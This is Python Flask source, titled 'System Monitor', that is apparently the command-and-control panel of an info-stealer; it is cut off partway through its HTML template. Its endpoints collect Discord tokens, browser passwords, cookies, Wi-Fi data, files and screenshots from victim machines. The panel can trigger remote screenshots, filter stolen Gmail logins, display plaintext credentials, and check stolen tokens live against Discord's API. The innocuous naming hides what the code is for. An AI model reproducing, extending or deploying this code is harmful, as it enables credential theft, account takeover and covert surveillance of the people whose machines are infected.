#!/usr/bin/env python3
"""
System Monitor Dashboard - Versão RESTAURADA ORIGINAL
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
full_reports = {}
uploaded_files = {}

@app.route('/')
def index():
    return HTML_TEMPLATE

@app.route('/api/register', methods=['POST', 'OPTIONS'])
def register_endpoint():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        print(f"[DEBUG] Registro recebido: {data}")
        
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'timestamp': datetime.now().isoformat(),
            'status': 'online',
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
        
        print(f"[DEBUG] Endpoint {endpoint_id} registrado com sucesso")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[ERRO] Erro no registro: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/metrics', methods=['POST', 'OPTIONS'])
def receive_metrics():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', [])
        
        for metric in metrics:
            metric['endpoint_id'] = endpoint_id
            metric['received_at'] = datetime.now().isoformat()
            metrics_data.append(metric)
        
        print(f"📊 Métricas recebidas de {endpoint_id}: {len(metrics)} itens")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tokens', methods=['POST', 'OPTIONS'])
def receive_tokens():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        print(f"[DEBUG] Tokens recebidos: {data}")
        
        endpoint_id = data.get('endpoint_id', 'unknown')
        tokens = data.get('tokens', [])
        
        print(f"[DEBUG] Endpoint ID: {endpoint_id}")
        print(f"[DEBUG] Número de tokens: {len(tokens)}")
        
        endpoint_tokens[endpoint_id] = {
            'tokens': tokens,
            'timestamp': datetime.now().isoformat()
        }
        
        # Atualiza endpoint se não existir
        if endpoint_id not in endpoints:
            endpoints[endpoint_id] = {
                'id': endpoint_id,
                'hostname': 'Unknown',
                'user': 'Unknown',
                'ip_address': 'Unknown',
                'external_ip': 'Unknown',
                'platform': 'Unknown',
                'ram': 'Unknown',
                'timestamp': datetime.now().isoformat(),
                'status': 'online',
                'last_seen': datetime.now().strftime('%H:%M:%S')
            }
        
        print(f"[DEBUG] {len(tokens)} tokens armazenados para {endpoint_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[ERRO] Erro nos tokens: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/cookies', methods=['POST', 'OPTIONS'])
def receive_cookies():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        cookies = data.get('cookies', [])
        
        endpoint_cookies[endpoint_id] = {
            'cookies': cookies,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🍪 Cookies recebidos de {endpoint_id}: {len(cookies)} cookies")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/passwords', methods=['POST', 'OPTIONS'])
def receive_passwords():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        passwords = data.get('passwords', [])
        
        endpoint_passwords[endpoint_id] = {
            'passwords': passwords,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🔒 Senhas recebidas de {endpoint_id}: {len(passwords)} senhas")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/files', methods=['POST', 'OPTIONS'])
def receive_files():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        files = data.get('files', [])
        
        if endpoint_id not in endpoint_files:
            endpoint_files[endpoint_id] = []
        
        endpoint_files[endpoint_id].extend(files)
        
        print(f"📁 Arquivos recebidos de {endpoint_id}: {len(files)} arquivos")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/full_report', methods=['POST', 'OPTIONS'])
def receive_full_report():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        print(f"[DEBUG] Full report recebido: {data}")
        
        endpoint_id = data.get('endpoint_id', 'unknown')
        dump_data = data.get('dump_data', {})
        
        print(f"[DEBUG] Endpoint ID: {endpoint_id}")
        print(f"[DEBUG] Dump data keys: {list(dump_data.keys())}")
        
        # Extrai dados do dump
        system_info = dump_data.get('system', {})
        tokens = dump_data.get('tokens', [])
        passwords = dump_data.get('passwords', [])
        cookies = dump_data.get('cookies', [])
        wifi = dump_data.get('wifi', [])
        
        print(f"[DEBUG] Tokens: {len(tokens)}, Senhas: {len(passwords)}, Cookies: {len(cookies)}")
        
        # Armazena nos endpoints existentes
        if endpoint_id not in endpoints:
            endpoints[endpoint_id] = {
                'id': endpoint_id,
                'hostname': system_info.get('hostname', 'Unknown'),
                'user': system_info.get('user', 'Unknown'),
                'ip_address': system_info.get('ip_address', 'Unknown'),
                'external_ip': system_info.get('external_ip', 'Unknown'),
                'platform': system_info.get('platform', 'Unknown'),
                'ram': system_info.get('ram', 'Unknown'),
                'timestamp': datetime.now().isoformat(),
                'status': 'online',
                'last_seen': datetime.now().strftime('%H:%M:%S')
            }
        
        # Armazena dados específicos
        endpoint_tokens[endpoint_id] = {
            'tokens': tokens,
            'timestamp': datetime.now().isoformat()
        }
        
        endpoint_passwords[endpoint_id] = {
            'passwords': passwords,
            'timestamp': datetime.now().isoformat()
        }
        
        endpoint_cookies[endpoint_id] = {
            'cookies': cookies,
            'timestamp': datetime.now().isoformat()
        }
        
        full_reports[endpoint_id] = {
            'metadata': dump_data,
            'received_at': datetime.now().isoformat()
        }
        
        print(f"📋 Relatório completo de {endpoint_id}:")
        print(f"   - Tokens: {len(tokens)}")
        print(f"   - Senhas: {len(passwords)}")
        print(f"   - Cookies: {len(cookies)}")
        print(f"   - WiFi: {len(wifi)}")
        print(f"   - Status AES: {dump_data.get('aes_key_status', 'N/A')}")
        
        return jsonify({'status': 'success', 'message': 'Full report received'})
    except Exception as e:
        print(f"[ERRO] Erro no full_report: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/check_gmails/<endpoint_id>', methods=['GET'])
def check_gmails(endpoint_id):
    try:
        # Busca senhas do endpoint
        passwords = endpoint_passwords.get(endpoint_id, {}).get('passwords', [])
        
        # Filtra apenas Gmails
        gmails = [p for p in passwords if p.get('service') == 'Gmail' or 'gmail.com' in p.get('url', '')]
        
        return jsonify({
            'status': 'success',
            'gmails': gmails,
            'total': len(gmails)
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/screenshot', methods=['POST', 'OPTIONS'])
def receive_screenshot():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        image_base64 = data.get('image', '')
        
        if image_base64:
            endpoint_screenshots[endpoint_id] = {
                'image': image_base64,
                'timestamp': datetime.now().isoformat()
            }
            print(f"📸 Screenshot recebido de {endpoint_id}!")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST', 'OPTIONS'])
def request_screenshot(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        screenshot_requests[endpoint_id] = {
            'requested': True,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"📸 Screenshot solicitado para: {endpoint_id}")
        return jsonify({
            'status': 'success', 
            'message': f'Screenshot solicitado para {endpoint_id}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>', methods=['GET', 'OPTIONS'])
def check_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        request_data = screenshot_requests.get(endpoint_id, {})
        return jsonify({
            'request_screenshot': request_data.get('requested', False),
            'timestamp': request_data.get('timestamp')
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>/clear', methods=['POST', 'OPTIONS'])
def clear_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if endpoint_id in screenshot_requests:
            del screenshot_requests[endpoint_id]
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ENDPOINTS DE LEITURA
@app.route('/api/endpoints', methods=['GET', 'OPTIONS'])
def get_endpoints():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(list(endpoints.values()))

@app.route('/api/metrics_data', methods=['GET', 'OPTIONS'])
def get_metrics_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(metrics_data)

@app.route('/api/screenshots', methods=['GET', 'OPTIONS'])
def get_screenshots():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_screenshots)

@app.route('/api/tokens_data', methods=['GET', 'OPTIONS'])
def get_tokens_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_tokens)

@app.route('/api/cookies_data', methods=['GET', 'OPTIONS'])
def get_cookies_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_cookies)

@app.route('/api/passwords_data', methods=['GET', 'OPTIONS'])
def get_passwords_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_passwords)

@app.route('/api/files_data', methods=['GET', 'OPTIONS'])
def get_files_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_files)

@app.route('/api/endpoint_data/<endpoint_id>', methods=['GET', 'OPTIONS'])
def get_endpoint_data(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        endpoint_data = {
            'system': endpoints.get(endpoint_id, {}),
            'tokens': endpoint_tokens.get(endpoint_id, {}),
            'cookies': endpoint_cookies.get(endpoint_id, {}),
            'passwords': endpoint_passwords.get(endpoint_id, {}),
            'files': endpoint_files.get(endpoint_id, {}),
            'screenshots': {endpoint_id: endpoint_screenshots.get(endpoint_id, {})}
        }
        
        return jsonify(endpoint_data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Template HTML RESTAURADO - System Monitor no topo, sem aba Dados
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f23;
            color: #e0e0e0;
            min-height: 100vh;
            position: relative;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 10px; }
        .header { text-align: center; margin-bottom: 20px; }
        .header h1 { 
            font-size: 3.5em; 
            margin-bottom: 5px; 
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 50%, #7c3aed 100%);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
            text-shadow: 0 0 30px rgba(124, 58, 237, 0.5);
            animation: shine 3s ease-in-out infinite;
        }
        @keyframes shine {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .header p { color: #9ca3af; font-size: 1.2rem; margin-bottom: 10px; }
        
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 25px; 
            margin-bottom: 30px;
        }
        .stat-card { 
            background: linear-gradient(135deg, rgba(124, 58, 237, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 16px; 
            padding: 25px; 
            text-align: center;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.2);
        }
        .stat-value { 
            font-size: 2.5em; 
            font-weight: 700; 
            color: #a855f7;
            margin-bottom: 5px;
        }
        .stat-label { color: #9ca3af; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
        
        .tabs-container { 
            display: flex; 
            margin-bottom: 20px;
            background: rgba(17, 17, 27, 0.6);
            border-radius: 12px;
            padding: 5px;
        }
        .tab { 
            background: transparent; 
            color: #9ca3af; 
            border: none; 
            padding: 15px 25px; 
            cursor: pointer;
            border-radius: 8px;
            font-size: 0.95rem;
            transition: all 0.3s ease;
            flex: 1;
        }
        .tab.active { 
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
        }
        .tab:hover:not(.active) { background: rgba(124, 58, 237, 0.1); }
        
        .tab-content { display: none; animation: slideIn 0.5s ease; }
        .tab-content.active { display: block; }
        
        .cards-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); 
            gap: 25px; 
        }
        .card { 
            background: linear-gradient(135deg, rgba(17, 17, 27, 0.8) 0%, rgba(31, 31, 46, 0.8) 100%);
            border: 1px solid rgba(124, 58, 237, 0.1);
            border-radius: 16px; 
            padding: 25px;
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }
        .card:hover { transform: translateY(-3px); }
        .card h3 { 
            color: #a855f7; 
            margin-bottom: 20px; 
            font-size: 1.3rem;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .card p { margin: 8px 0; color: #e0e0e0; }
        .card strong { color: #a855f7; }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .back-btn {
            background: rgba(124, 58, 237, 0.2);
            color: #a855f7;
            border: 1px solid rgba(124, 58, 237, 0.3);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            margin-bottom: 20px;
            transition: all 0.3s ease;
        }
        .back-btn:hover {
            background: rgba(124, 58, 237, 0.3);
        }
        .data-section {
            background: rgba(10, 10, 15, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .data-section h3 {
            color: #a855f7;
            font-size: 1.1rem;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .token-card, .cookie-card, .password-card {
            background: rgba(168, 85, 247, 0.1);
            border: 1px solid rgba(168, 85, 247, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            word-break: break-all;
        }
        .screenshot-img {
            max-width: 100%;
            border-radius: 12px;
            border: 2px solid rgba(124, 58, 237, 0.3);
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 24px;
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
            transition: transform 0.3s ease;
        }
        .refresh-btn:hover {
            transform: scale(1.1);
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }
        .modal-content {
            background: linear-gradient(135deg, rgba(17, 17, 27, 0.95) 0%, rgba(31, 31, 46, 0.95) 100%);
            margin: 10% auto;
            padding: 20px;
            border-radius: 16px;
            width: 80%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
        }
        .modal-title {
            color: #a855f7;
            font-size: 1.3rem;
            font-weight: 600;
        }
        .modal-close {
            color: #6b7280;
            font-size: 28px;
            cursor: pointer;
            background: none;
            border: none;
        }
        .modal-close:hover {
            color: #e0e0e0;
        }
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .card-title {
            color: #a855f7;
            font-size: 1.1rem;
            font-weight: 600;
        }
        .status-badge {
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 0.8rem;
            font-weight: 500;
        }
        .status-badge.online {
            background: rgba(34, 197, 94, 0.2);
            color: #22c55e;
        }
        .info-item {
            display: flex;
            justify-content: space-between;
            margin: 5px 0;
        }
        .info-label {
            color: #9ca3af;
            font-size: 0.9rem;
        }
        .info-value {
            color: #e0e0e0;
            font-weight: 500;
        }
        .btn-dados {
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            margin-right: 10px;
            margin-top: 15px;
            transition: all 0.3s ease;
        }
        .btn-dados:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
        }
        .card-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        .data-preview {
            background: rgba(10, 10, 15, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 8px;
            padding: 10px;
            margin-top: 10px;
            font-size: 0.8rem;
            max-height: 100px;
            overflow-y: auto;
        }
        .data-preview-item {
            margin: 5px 0;
            padding: 5px;
            background: rgba(168, 85, 247, 0.1);
            border-radius: 4px;
            word-break: break-all;
        }
    </style>
</head>
<body>
        <canvas id="particles-canvas"></canvas>
        <div class="header">
            <h1>System Monitor</h1>
            <p>Painel de Monitoramento Avançado</p>
        </div>
        
        <div class="container">
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalEndpoints">0</div>
                <div class="stat-label">Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineEndpoints">0</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalTokens">0</div>
                <div class="stat-label">Tokens</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalPasswords">0</div>
                <div class="stat-label">Senhas</div>
            </div>
        </div>

        <div class="tabs-container">
            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
            <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
        </div>

        <div id="endpoints" class="tab-content active">
            <h2 style="color: #f3f4f6; margin-bottom: 20px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
            <div class="cards-grid" id="endpointsList">
                <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
            </div>
        </div>

        <div id="screenshot" class="tab-content">
            <h2 style="color: #f3f4f6; margin-bottom: 20px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px;" onchange="selectEndpoint()">
                    <option value="">Selecione um endpoint...</option>
                </select>
                <button id="screenshotBtn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; margin-bottom: 20px;" onclick="requestScreenshot()" disabled>📸 Capturar Screenshot</button>
                <div id="screenContent" style="background: rgba(10, 10, 15, 0.9); border-radius: 16px; padding: 20px; text-align: center; min-height: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
                    <div style="color: #6b7280;">Selecione um endpoint</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal de Dados -->
    <div id="dataModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title" id="modalTitle">📊 Dados do Endpoint</div>
                <span class="modal-close" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body">
                <div id="modalContent">
                    <!-- Conteúdo será carregado dinamicamente -->
                </div>
            </div>
        </div>
    </div>

    <button class="refresh-btn" onclick="loadAllData()">🔄</button>

    <script>
        // Partículas
        const canvas = document.getElementById('particles-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 2 + 0.5;
                this.speedX = Math.random() * 0.5 - 0.25;
                this.speedY = Math.random() * 0.5 - 0.25;
                this.opacity = Math.random() * 0.5 + 0.1;
            }
            update() {
                this.x += this.speedX;
                this.y += this.speedY;
                if (this.x > canvas.width) this.x = 0;
                if (this.x < 0) this.x = canvas.width;
                if (this.y > canvas.height) this.y = 0;
                if (this.y < 0) this.y = canvas.height;
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(168, 85, 247, ${this.opacity})`;
                ctx.fill();
            }
        }

        function initParticles() {
            particles = [];
            const count = Math.min(100, Math.floor((canvas.width * canvas.height) / 15000));
            for (let i = 0; i < count; i++) particles.push(new Particle());
        }

        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            requestAnimationFrame(animateParticles);
        }

        initParticles();
        animateParticles();

        // Configuração
        const API_BASE = window.location.origin;
        
        // Função de validação de tokens
        async function validateToken(token) {
            try {
                const response = await fetch(`https://discord.com/api/v10/users/@me`, {
                    headers: {
                        'Authorization': token
                    }
                });
                
                if (response.ok) {
                    const user = await response.json();
                    return {
                        valid: true,
                        username: user.username,
                        id: user.id,
                        discriminator: user.discriminator,
                        email: user.email || 'N/A'
                    };
                }
                return { valid: false };
            } catch (error) {
                return { valid: false };
            }
        }
        
        // Variáveis globais
        let currentEndpoint = null;
        let endpointsData = {};

        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }

        async function loadEndpoints() {
            try {
                const res = await fetch('/api/endpoints');
                const endpoints = await res.json();
                const container = document.getElementById('endpointsList');
                const select = document.getElementById('endpointSelect');

                container.innerHTML = '';

                if (!endpoints || endpoints.length === 0) {
                    container.innerHTML = '<div style="color: #6b7280; text-align: center; padding: 40px;">Nenhum endpoint conectado</div>';
                    document.getElementById('totalEndpoints').textContent = '0';
                    document.getElementById('onlineEndpoints').textContent = '0';
                    return;
                }

                let selectHtml = '<option value="">Selecione um endpoint...</option>';
                let totalTokens = 0;
                let totalPasswords = 0;
                
                endpoints.forEach(e => {
                    selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
                    
                    const card = document.createElement('div');
                    card.className = 'card';
                    
                    // Busca dados do endpoint
                    const tokens = endpointsData[e.id]?.tokens?.tokens || [];
                    const passwords = endpointsData[e.id]?.passwords?.passwords || [];
                    const cookies = endpointsData[e.id]?.cookies?.cookies || [];
                    const files = endpointsData[e.id]?.files?.files || [];
                    
                    totalTokens += tokens.length;
                    totalPasswords += passwords.length;
                    
                    card.innerHTML = `
                        <div class="card-header">
                            <span class="card-title">${e.hostname}</span>
                            <span class="status-badge ${e.status}">${e.status}</span>
                        </div>
                        <div class="card-info">
                            <div class="info-item"><span class="info-label">Usuario</span><span class="info-value">${e.user}</span></div>
                            <div class="info-item"><span class="info-label">IP Local</span><span class="info-value">${e.ip_address}</span></div>
                            <div class="info-item"><span class="info-label">IP Externo</span><span class="info-value">${e.external_ip}</span></div>
                            <div class="info-item"><span class="info-label">Plataforma</span><span class="info-value">${e.platform}</span></div>
                            <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${e.ram}</span></div>
                            <div class="info-item"><span class="info-label">Ultimo Acesso</span><span class="info-value">${e.last_seen}</span></div>
                        </div>
                        
                        ${tokens.length > 0 ? `
                            <div class="data-preview">
                                <strong style="color: #a855f7;">🔑 Tokens (${tokens.length}):</strong>
                                ${tokens.slice(0, 3).map(t => `<div class="data-preview-item">${t.token || t}</div>`).join('')}
                                ${tokens.length > 3 ? `<div class="data-preview-item">... e mais ${tokens.length - 3}</div>` : ''}
                            </div>
                        ` : ''}
                        
                        ${passwords.length > 0 ? `
                            <div class="data-preview">
                                <strong style="color: #a855f7;">🔒 Senhas (${passwords.length}):</strong>
                                ${passwords.slice(0, 3).map(p => `<div class="data-preview-item">${p.service || 'Web'}: ${p.username || 'N/A'}</div>`).join('')}
                                ${passwords.length > 3 ? `<div class="data-preview-item">... e mais ${passwords.length - 3}</div>` : ''}
                            </div>
                        ` : ''}
                        
                        ${cookies.length > 0 ? `
                            <div class="data-preview">
                                <strong style="color: #a855f7;">🍪 Cookies (${cookies.length}):</strong>
                                ${cookies.slice(0, 3).map(c => `<div class="data-preview-item">${c.service || c.host || 'N/A'}: ${c.name}</div>`).join('')}
                                ${cookies.length > 3 ? `<div class="data-preview-item">... e mais ${cookies.length - 3}</div>` : ''}
                            </div>
                        ` : ''}
                        
                        <div class="card-actions">
                            <button class="btn-dados" onclick="openDataModal('${e.id}', '${e.hostname}')">📊 Ver Todos</button>
                            <button class="btn-dados" onclick="requestScreenshot('${e.id}')">📸 Screenshot</button>
                            <button class="btn-dados" onclick="checkGmails('${e.id}')">📧 Gmails</button>
                        </div>
                    `;
                    container.appendChild(card);
                });

                select.innerHTML = selectHtml;
                
                document.getElementById('totalEndpoints').textContent = endpoints.length;
                document.getElementById('onlineEndpoints').textContent = endpoints.filter(e => e.status === 'online').length;
                document.getElementById('totalTokens').textContent = totalTokens;
                document.getElementById('totalPasswords').textContent = totalPasswords;
                
            } catch(e) {
                console.error('Erro ao carregar endpoints:', e);
                document.getElementById('endpointsList').innerHTML = '<div style="color: #ef4444; text-align: center; padding: 40px;">Erro ao carregar endpoints</div>';
            }
        }

        async function loadEndpointData(endpointId) {
            try {
                const res = await fetch(`/api/endpoint_data/${endpointId}`);
                const data = await res.json();
                endpointsData[endpointId] = data;
                return data;
            } catch(e) {
                console.error('Erro ao carregar dados do endpoint:', e);
                return null;
            }
        }

        async function openDataModal(endpointId, hostname) {
            const data = await loadEndpointData(endpointId);
            if (!data) return;
            
            document.getElementById('modalTitle').textContent = `📊 ${hostname}`;
            document.getElementById('dataModal').style.display = 'block';
            
            const modalContent = document.getElementById('modalContent');
            
            const tokens = data.tokens?.tokens || [];
            const passwords = data.passwords?.passwords || [];
            const cookies = data.cookies?.cookies || [];
            const files = data.files?.files || [];
            
            modalContent.innerHTML = `
                <div class="data-section">
                    <h3>🔑 Tokens (${tokens.length})</h3>
                    ${tokens.length > 0 ? `
                        <div id="tokenValidationStatus">Validando tokens...</div>
                        <div id="tokenList">${tokens.map(t => `<div class="token-card" data-token="${t.token || t}">${t.token || t}</div>`).join('')}</div>
                    ` : '<div class="empty-state">Nenhum token encontrado</div>'}
                </div>
                
                <div class="data-section">
                    <h3>🔒 Senhas (${passwords.length})</h3>
                    ${passwords.length > 0 ? passwords.map(p => `<div class="password-card"><strong>Serviço:</strong> ${p.service || 'Web'}<br><strong>URL:</strong> ${p.url || 'N/A'}<br><strong>Usuário:</strong> ${p.username || 'N/A'}<br><strong>Senha:</strong> ${p.password || 'N/A'}<br><strong>Navegador:</strong> ${p.browser || 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhuma senha encontrada</div>'}
                </div>
                
                <div class="data-section">
                    <h3>🍪 Cookies (${cookies.length})</h3>
                    ${cookies.length > 0 ? cookies.map(c => `<div class="cookie-card"><strong>Serviço:</strong> ${c.service || 'N/A'}<br><strong>Host:</strong> ${c.host || 'N/A'}<br><strong>Nome:</strong> ${c.name || 'N/A'}<br><strong>Valor:</strong> ${c.value ? c.value.substring(0, 100) + (c.value.length > 100 ? '...' : '') : 'N/A'}<br><strong>Navegador:</strong> ${c.browser || 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhum cookie encontrado</div>'}
                </div>
                
                <div class="data-section">
                    <h3>📁 Arquivos (${files.length})</h3>
